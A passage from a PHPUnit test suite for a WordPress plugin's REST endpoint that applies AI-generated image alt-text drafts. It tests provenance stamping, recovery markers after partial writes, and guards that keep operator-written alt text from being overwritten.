        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();
        $this->assertSame([], $data['applied']);
        $this->assertSame([], $data['partial']);
        $this->assertSame([71], $data['skipped_existing']);
        // Alt unchanged; provenance must not be invented for operator text.
        $this->assertSame('a dog in a park', get_post_meta(71, '_wp_attachment_image_alt', true));
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance', true));
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance_pending', true));
    }

    /**
     * R22-BR-02 / R23-BR-07 [TEST-15]: foreign-run (or single-image) same-draft
     * marker is recovery evidence — re-apply must complete provenance, not
     * skip_existing. Renamed from testApplyRunDraftsGuardsWhenPendingMarkerRunIdDiffers
     * (body asserted applied, not a guard).
     *
     * OLD (pre-R22-BR-02): run_id inequality → skipped_existing, provenance '',
     * marker left in place (unrecoverable partial contract).
     * NEW: same draft_hash + stored alt match + !prov_is_this_run → applied,
     * provenance non-empty, marker cleared. Ownership is irrelevant to whether
     * the alt for this draft already landed.
     */
    public function testApplyRunDraftsRecoversWhenPendingMarkerRunIdDiffers(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(71);
        $draft = 'a dog in a park';
        $this->setPostMeta(71, '_wp_attachment_image_alt', $draft);
        $this->setPostMeta(71, '_acx_description_provenance_pending', [
            'run_id' => '22222222-2222-2222-2222-222222222222',
            'draft_hash' => \AltContext\Api\Services\DescriptionHistoryService::hash_for_stored_alt($draft),
        ]);
        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => $draft, 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();
        // OLD: $this->assertSame([], $data['applied']);
        // OLD: $this->assertSame([71], $data['skipped_existing']);
        $this->assertSame([71], $data['applied']);
        $this->assertSame([], $data['skipped_existing']);
        $this->assertSame([], $data['partial']);
        $this->assertSame($draft, get_post_meta(71, '_wp_attachment_image_alt', true));
        // OLD: $this->assertSame('', get_post_meta(71, '_acx_description_provenance', true));
        $prov = get_post_meta(71, '_acx_description_provenance', true);
        $this->assertIsArray($prov);
        $this->assertSame($runId, $prov['run_id'] ?? null);
        // R23-BR-08 / R23-BR-20: foreign-owned marker recovery stamps descriptor.
        $this->assertArrayNotHasKey('recovered_from_run_id', $prov);
        $this->assertIsArray($prov['recovered_from'] ?? null);
        $this->assertSame('22222222-2222-2222-2222-222222222222', $prov['recovered_from']['origin'] ?? null);
        $this->assertSame(
            \AltContext\Api\AltTextWriteStatus::RECOVERY_KIND_RUN,
            $prov['recovered_from']['kind'] ?? null
        );
        $this->assertSame(
            ['22222222-2222-2222-2222-222222222222'],
            $prov['recovered_from']['chain'] ?? null
        );
        // OLD: marker left in place for the foreign run.
        // NEW: marker cleared once provenance verifies.
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance_pending', true));
    }

    /**
     * R22-BR-02 [TEST-15]: second apply after a foreign-surface partial actually
     * recovers (applied + provenance + marker cleared). Wave-8
     * testApplyRunDraftsAcceptsPreExistingSameDraftMarkerWhenPlantFails stops
     * at partial and never retries — that omission is the finding.
     *
     * RED under: reintroduce run_id equality on the is_non_clobber_completion
     * marker leg.
     *
     * R23-BR-08 / R23-BR-20: recovered envelope carries applying run_id AND
     * recovered_from descriptor naming marker owner (honest attribution; no
     * fabricated model metadata).
     */
    public function testApplyRunDraftsSecondApplyRecoversForeignRunSameDraftMarker(): void
    {
        $firstRunId  = 'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa';
        $secondRunId = 'bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb';
        $draft       = 'a dog in a park';
        $this->plantPostType(71);

        // First apply (run A): provenance fails → partial + marker owned by A.
        $GLOBALS['__ac_update_post_meta_fail'][71]['_acx_description_provenance'] = true;
        $this->queueRunStatusResponse($firstRunId, 'completed');
        $this->plantSubmittedMediaIds($firstRunId, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $firstRunId,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => $draft, 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);
        $first = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $firstRunId . '/apply');
        $first->set_param('run_id', $firstRunId);
        $firstResponse = $this->controller->apply_describe_run_drafts($first);
        $this->assertNotInstanceOf(\WP_Error::class, $firstResponse);
        $this->assertSame([71], $firstResponse->get_data()['partial']);
        $pending = get_post_meta(71, '_acx_description_provenance_pending', true);
        $this->assertIsArray($pending);
        $this->assertSame($firstRunId, $pending['run_id'] ?? null);
        $this->assertSame($draft, get_post_meta(71, '_wp_attachment_image_alt', true));
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance', true));

        // Second apply (run B): same draft, no overwrite. Foreign marker must unlock recovery.
        unset($GLOBALS['__ac_update_post_meta_fail'][71]['_acx_description_provenance']);
        $this->queueRunStatusResponse($secondRunId, 'completed');
        $this->plantSubmittedMediaIds($secondRunId, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $secondRunId,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => $draft, 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);
        $second = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $secondRunId . '/apply');
        $second->set_param('run_id', $secondRunId);
        $secondResponse = $this->controller->apply_describe_run_drafts($second);
        $this->assertNotInstanceOf(\WP_Error::class, $secondResponse);
        $data = $secondResponse->get_data();
        $this->assertSame([71], $data['applied'], 'foreign same-draft marker must unlock recovery on second apply');
        $this->assertSame([], $data['partial']);
        $this->assertSame([], $data['skipped_existing']);
        $this->assertSame($draft, get_post_meta(71, '_wp_attachment_image_alt', true));
        $prov = get_post_meta(71, '_acx_description_provenance', true);
        $this->assertIsArray($prov);
        $this->assertNotSame('', $prov);
        $this->assertSame($secondRunId, $prov['run_id'] ?? null);
        // R23-BR-08 / R23-BR-20: "run B completed provenance for a write started by run A".
        $this->assertArrayNotHasKey('recovered_from_run_id', $prov);
        $this->assertIsArray($prov['recovered_from'] ?? null);
        $this->assertSame($firstRunId, $prov['recovered_from']['origin'] ?? null);
        $this->assertSame(
            \AltContext\Api\AltTextWriteStatus::RECOVERY_KIND_RUN,
            $prov['recovered_from']['kind'] ?? null
        );
        $this->assertSame([$firstRunId], $prov['recovered_from']['chain'] ?? null);
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance_pending', true));
    }

    /**
     * BR-82 / R23-BR-05: pending marker whose draft_hash does not match the
     * current draft (draft changed since the partial) must stay guarded.
     * Own-run stale marker is collected (not live for the stored alt).
     */
    public function testApplyRunDraftsGuardsWhenPendingMarkerDraftHashDiffers(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(71);
        $currentDraft = 'a dog in a park';
        // Stored alt equals the *current* draft (coincidental / re-describe),
        // but the marker was for an older draft string.
        $this->setPostMeta(71, '_wp_attachment_image_alt', $currentDraft);
        $this->setPostMeta(71, '_acx_description_provenance_pending', [
            'run_id' => $runId,
            'draft_hash' => hash('sha256', 'older draft that is no longer current'),
        ]);
        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => $currentDraft, 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();
        $this->assertSame([], $data['applied']);
        $this->assertSame([71], $data['skipped_existing']);
        $this->assertSame($currentDraft, get_post_meta(71, '_wp_attachment_image_alt', true));
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance', true));
        // R23-BR-05: own-run marker not live for stored alt is collected.
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance_pending', true));
    }

    /**
     * BR-82: human-authored alt equal to draft with human-edit meta present and
     * no pending marker stays guarded; human-edit meta is untouched.
     */
    public function testApplyRunDraftsGuardsHumanAuthoredAltEqualToDraftWithoutMarker(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(71);
        $draft = 'a dog in a park';
        $humanEdit = [
            'source' => 'inline_correction',
            'edited_at' => '2026-01-01T00:00:00+00:00',
            'previous_alt' => 'something else',
        ];
        $this->setPostMeta(71, '_wp_attachment_image_alt', $draft);
        $this->setPostMeta(71, '_acx_description_human_edit', $humanEdit);
        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => $draft, 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();
        $this->assertSame([], $data['applied']);
        $this->assertSame([71], $data['skipped_existing']);
        $this->assertSame($draft, get_post_meta(71, '_wp_attachment_image_alt', true));
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance', true));
        $this->assertSame($humanEdit, get_post_meta(71, '_acx_description_human_edit', true));
    }

    /**
     * BR-88a / BR-126: alt===draft with provenance already this run's envelope
     * stays skipped_existing; provenance must be byte-identical after apply
     * (no applied_at churn). BR-114: matching marker is cleared on rejection.
     */
    public function testApplyRunDraftsSkipsWhenProvenanceAlreadyComplete(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(71);
        $draft = 'a dog in a park';
        $existingProv = [
            'adapter' => 'florence',
            'model_id' => 'florence-2',
            'source' => 'bulk_describe_run',
            'run_id' => $runId,
            'applied_at' => '2026-01-15T12:00:00+00:00',
            'alt_text_draft' => $draft,
        ];
        $this->setPostMeta(71, '_wp_attachment_image_alt', $draft);
        $this->setPostMeta(71, '_acx_description_provenance', $existingProv);
        // Matching marker must not reopen a completed provenance write for this run.
        $this->setPostMeta(71, '_acx_description_provenance_pending', [
            'run_id' => $runId,
            'draft_hash' => hash('sha256', $draft),
        ]);
        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => $draft, 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();
        $this->assertSame([], $data['applied']);
        $this->assertSame([71], $data['skipped_existing']);
        $this->assertSame($draft, get_post_meta(71, '_wp_attachment_image_alt', true));
        // Byte-identical: no applied_at churn from a re-stamp.
        $this->assertSame($existingProv, get_post_meta(71, '_acx_description_provenance', true));
        // BR-114: orphaned marker for a completed this-run envelope is cleared.
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance_pending', true));
    }

    /**
     * BR-98: bulk-applied provenance must carry alt_text_draft so history's
     * resolve_generated_alt_text does not render "No draft recorded."
     */
    public function testApplyRunDraftsProvenanceCarriesAltTextDraft(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(71);
        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => 'a dog in a park', 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();
        $this->assertSame([71], $data['applied']);
        $prov = get_post_meta(71, '_acx_description_provenance', true);
        $this->assertIsArray($prov);
        $this->assertSame('a dog in a park', $prov['alt_text_draft']);
        $this->assertSame(get_post_meta(71, '_wp_attachment_image_alt', true), $prov['alt_text_draft']);
    }

    /**
     * BR-92: duplicate media_id rows are collapsed to first-seen so one id
     * cannot land in two mutually exclusive buckets.
     */
    public function testApplyRunDraftsDedupesDuplicateMediaIdsToFirstSeen(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(71);
        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    // First-seen wins: draft A applied.
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => 'first draft wins', 'caption' => null, 'provenance' => ['adapter' => 'florence']],
                    // Same id, different draft — must not produce a second bucket entry.
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => 'second draft would conflict', 'caption' => null, 'provenance' => ['adapter' => 'florence']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();
        $this->assertSame([71], $data['applied']);
        $this->assertSame([], $data['partial']);
        $this->assertSame([], $data['skipped_existing']);
        $this->assertSame([], $data['skipped_no_draft']);
        $this->assertSame([], $data['failed']);
        // First-seen draft only.
        $this->assertSame('first draft wins', get_post_meta(71, '_wp_attachment_image_alt', true));
        $prov = get_post_meta(71, '_acx_description_provenance', true);
        $this->assertIsArray($prov);
        $this->assertSame('first draft wins', $prov['alt_text_draft']);
    }

    /**
     * Guard still holds: when stored alt differs from the draft (operator-
     * authored text), existing_alt without overwrite_media_ids stays
     * skipped_existing — non-clobber completion must not weaken real opt-in.
     */
    public function testApplyRunDraftsStillGuardsWhenStoredAltDiffersFromDraft(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(70);
        $this->plantPostType(71);
        $this->plantPostType(72);
        // Operator alt differs from draft 70 ("a cat on a sofa").
        $this->setPostMeta(70, '_wp_attachment_image_alt', 'human-authored alt');
        // 71 also has operator alt that is not the draft — must not auto-apply.
        $this->setPostMeta(71, '_wp_attachment_image_alt', 'different human alt');
        $this->queueRunStatusResponse($runId, 'completed');
        $this->queueRunItemsResponse($runId);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);

        $data = $response->get_data();
        $this->assertSame([], $data['applied']);
        $this->assertSame([], $data['partial']);
        // Both existing-alt items differ from their drafts → both guarded.
        $this->assertSame([70, 71], $data['skipped_existing']);
        $this->assertSame([72], $data['skipped_no_draft']);
        $this->assertSame('human-authored alt', get_post_meta(70, '_wp_attachment_image_alt', true));
        $this->assertSame('different human alt', get_post_meta(71, '_wp_attachment_image_alt', true));
        $this->assertSame('', get_post_meta(70, '_acx_description_provenance', true));
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance', true));
    }

    /**
     * BR-119: matching pending marker + stored alt ≠ draft + no provenance must
     * stay skipped_existing (anti-clobber). Goes RED if `$stored_alt === $draft`
     * is deleted from the recovery predicate. BR-114 / R23-BR-05: own-run marker
     * is stale for the stored operator alt (draft_hash names the draft, not the
     * operator text) so it is collected — not because alt_diverged alone wipes
     * live evidence [R23-BR-18].
     */
    public function testApplyRunDraftsGuardsWhenPendingMarkerButStoredAltDiffersFromDraft(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(71);
        $draft = 'a dog in a park';
        $operatorAlt = 'operator edited after partial';
        $this->setPostMeta(71, '_wp_attachment_image_alt', $operatorAlt);
        // Matching marker would unlock recovery if the anti-clobber conjunct were gone.
        // Hash is for $draft, not $operatorAlt → stale for stored alt.
        $this->setPostMeta(71, '_acx_description_provenance_pending', [
            'run_id' => $runId,
            'draft_hash' => hash('sha256', $draft),
        ]);
        // No provenance — only the alt!==draft conjunct keeps this guarded.
        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => $draft, 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();
        $this->assertSame([], $data['applied']);
        $this->assertSame([], $data['partial']);
        $this->assertSame([71], $data['skipped_existing']);
        $this->assertSame([], $data['failed']);
        // Operator edit preserved; draft not applied; no provenance invented.
        $this->assertSame($operatorAlt, get_post_meta(71, '_wp_attachment_image_alt', true));
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance', true));
        // BR-114 / R23-BR-05: own-run marker stale for stored alt is collected.
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance_pending', true));
    }

    /**
     * BR-119: non-string stored alt with a matching marker must stay guarded
     * (is_string conjunct). WP stub allows planting non-string meta.
     */
    public function testApplyRunDraftsGuardsWhenStoredAltIsNonStringWithPendingMarker(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(71);
        $draft = 'a dog in a park';
        // Corrupt / unexpected meta type — must not unlock recovery.
        $this->setPostMeta(71, '_wp_attachment_image_alt', ['not' => 'a string']);
        $this->setPostMeta(71, '_acx_description_provenance_pending', [
            'run_id' => $runId,
            'draft_hash' => hash('sha256', $draft),
        ]);
        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => $draft, 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();
        $this->assertSame([], $data['applied']);
        $this->assertSame([71], $data['skipped_existing']);
        $this->assertSame(['not' => 'a string'], get_post_meta(71, '_wp_attachment_image_alt', true));
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance', true));
        // Non-string alt is an alt-diverge rejection for this run's marker.
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance_pending', true));
    }

    /**
     * BR-106: when the first row for a media_id has no draft and a later row has
     * one, keep the usable draft — not first-seen-at-any-cost.
     */
    public function testApplyRunDraftsDedupesPreferringFirstNonEmptyDraft(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(71);
        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    // First-seen has no draft — must not force skipped_no_draft.
                    ['media_id' => 71, 'status' => 'failed', 'alt_text_draft' => null, 'caption' => null, 'provenance' => null],
                    // Later completed row carries the only usable draft.
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => 'good draft', 'caption' => null, 'provenance' => ['adapter' => 'florence']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();
        $this->assertSame([71], $data['applied']);
        $this->assertSame([], $data['skipped_no_draft']);
        $this->assertSame([], $data['partial']);
        $this->assertSame([], $data['failed']);
        $this->assertSame('good draft', get_post_meta(71, '_wp_attachment_image_alt', true));
        $prov = get_post_meta(71, '_acx_description_provenance', true);
        $this->assertIsArray($prov);
        $this->assertSame('good draft', $prov['alt_text_draft']);
    }

    /**
     * R19-BR-21: bulk apply envelope keys come from BULK_APPLY_BUCKETS (ordered),
     * and each per-item outcome the apply loop can produce lands in its bucket.
     * Mis-routing a media_id must turn this RED. Wire keys are not renamed.
     */
    public function testBulkApplyBucketKeysAndOutcomeRouting(): void
    {
        $this->assertSame(
            array(
                'applied',
                'partial',
                'skipped_existing',
                'skipped_no_draft',
                'skipped_invalid',
                'failed',
            ),
            AltTextWriteStatus::BULK_APPLY_BUCKETS
        );

        $runId = '22222222-2222-2222-2222-222222222222';
        // 70: existing alt → skipped_existing
        // 71: empty draft → skipped_no_draft
        // 72: non-attachment → skipped_invalid
        // 73: alt write fails → failed
        // 74: provenance fails, marker lands → partial
        // 75: clean write → applied
        $this->plantPostType(70);
        $this->plantPostType(71);
        $this->plantPostType(72, 'post');
        $this->plantPostType(73);
        $this->plantPostType(74);
        $this->plantPostType(75);
        $this->setPostMeta(70, '_wp_attachment_image_alt', 'human-authored alt');
        $GLOBALS['__ac_update_post_meta_fail'][73]['_wp_attachment_image_alt'] = true;
        $GLOBALS['__ac_update_post_meta_fail'][74]['_acx_description_provenance'] = true;

        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [70, 71, 72, 73, 74, 75]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 70, 'status' => 'completed', 'alt_text_draft' => 'would clobber', 'caption' => null, 'provenance' => ['adapter' => 'florence']],
                    ['media_id' => 71, 'status' => 'failed', 'alt_text_draft' => '', 'caption' => null, 'provenance' => null],
                    ['media_id' => 72, 'status' => 'completed', 'alt_text_draft' => 'not attachment', 'caption' => null, 'provenance' => ['adapter' => 'florence']],
                    ['media_id' => 73, 'status' => 'completed', 'alt_text_draft' => 'alt write fails', 'caption' => null, 'provenance' => ['adapter' => 'florence']],
                    ['media_id' => 74, 'status' => 'completed', 'alt_text_draft' => 'partial draft', 'caption' => null, 'provenance' => ['adapter' => 'florence']],
                    ['media_id' => 75, 'status' => 'completed', 'alt_text_draft' => 'applied draft', 'caption' => null, 'provenance' => ['adapter' => 'florence']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);
        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();

        // Key set + order match the centralised surface (run_id first, then buckets).
        $this->assertSame(
            array_merge(array('run_id'), AltTextWriteStatus::BULK_APPLY_BUCKETS),
            array_keys($data)
        );

        // Outcome → bucket pins (AltTextWriteStatus correspondence documented on BULK_APPLY_BUCKETS).
        $this->assertSame([75], $data['applied']); // WRITTEN analogue
        $this->assertSame([74], $data['partial']); // PARTIAL
        $this->assertSame([70], $data['skipped_existing']); // SKIPPED_EXISTING_ALT
        $this->assertSame([71], $data['skipped_no_draft']); // SKIPPED_EMPTY_ALT_TEXT analogue
        $this->assertSame([72], $data['skipped_invalid']); // bulk-only
        $this->assertSame([73], $data['failed']); // FAILED

        $pending = get_post_meta(74, '_acx_description_provenance_pending', true);
        $this->assertIsArray($pending);
        $this->assertSame($runId, $pending['run_id']);
        $this->assertSame(hash('sha256', 'partial draft'), $pending['draft_hash']);
    }

    /**
     * BR-102: when provenance fails and the recovery marker cannot be planted,
     * the item is `failed` (not `partial`). Partial is presented as retryable;
     * without a marker the next apply cannot recover. [RLSE-05] [INT-11]
     */
    public function testApplyRunDraftsBucketsFailedWhenMarkerWriteFails(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(71);
        // Alt write succeeds; provenance write fails; marker write also fails.
        $GLOBALS['__ac_update_post_meta_fail'][71]['_acx_description_provenance'] = true;
        $GLOBALS['__ac_update_post_meta_fail'][71]['_acx_description_provenance_pending'] = true;
        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => 'a dog in a park', 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();
        // Not partial — recovery is impossible without a marker.
        $this->assertSame([], $data['applied']);
        $this->assertSame([], $data['partial']);
        $this->assertSame([71], $data['failed']);
        // Alt stayed written (no roll-back); marker absent; provenance absent.
        $this->assertSame('a dog in a park', get_post_meta(71, '_wp_attachment_image_alt', true));
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance', true));
        $this->assertSame('', get_post_meta(71, '_acx_description_provenance_pending', true));
    }

    /**
     * R20-BR-20 / R21-BR-03: marker write persists verified-SHAPE array with
     * wrong draft_hash → failed (draft_hash match leg, not merely is_array).
     */
    public function testApplyRunDraftsBucketsFailedWhenMarkerStoreDiverges(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(71);
        $GLOBALS['__ac_update_post_meta_fail'][71]['_acx_description_provenance'] = true;
        $divergent = [
            'run_id' => 'wrong',
            'draft_hash' => 'deadbeef',
        ];
        $GLOBALS['__ac_update_post_meta_mutate'][71]['_acx_description_provenance_pending'] = $divergent;
        $this->queueRunStatusResponse($runId, 'completed');
        $this->plantSubmittedMediaIds($runId, [71]);
        $this->queueHttpResponse([
            'response' => ['code' => 200, 'message' => 'OK'],
            'body' => json_encode([
                'tenant_id' => self::currentTenantId(),
                'run_id' => $runId,
                'items' => [
                    ['media_id' => 71, 'status' => 'completed', 'alt_text_draft' => 'a dog in a park', 'caption' => 'dog', 'provenance' => ['adapter' => 'florence', 'model_id' => 'florence-2']],
                ],
            ]),
        ]);

        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
        $request->set_param('run_id', $runId);

        $response = $this->controller->apply_describe_run_drafts($request);
        $this->assertNotInstanceOf(\WP_Error::class, $response);
        $data = $response->get_data();
        $this->assertSame([], $data['partial']);
        $this->assertSame([71], $data['failed']);
        $this->assertSame($divergent, get_post_meta(71, '_acx_description_provenance_pending', true));
    }

    /**
     * R21-BR-03: non-array marker store fails the shape leg alone.
     */
    public function testApplyRunDraftsBucketsFailedWhenMarkerStoreIsNonArray(): void
    {
        $runId = '11111111-1111-1111-1111-111111111111';
        $this->plantPostType(71);
        $GLOBALS['__ac_update_post_meta_fail'][71]['_acx_description_provenance'] = true;
        $GLOBALS['__ac_update_post_meta_mutate'][71]['_acx_description_provenance_pending'] = 'GARBAGE';
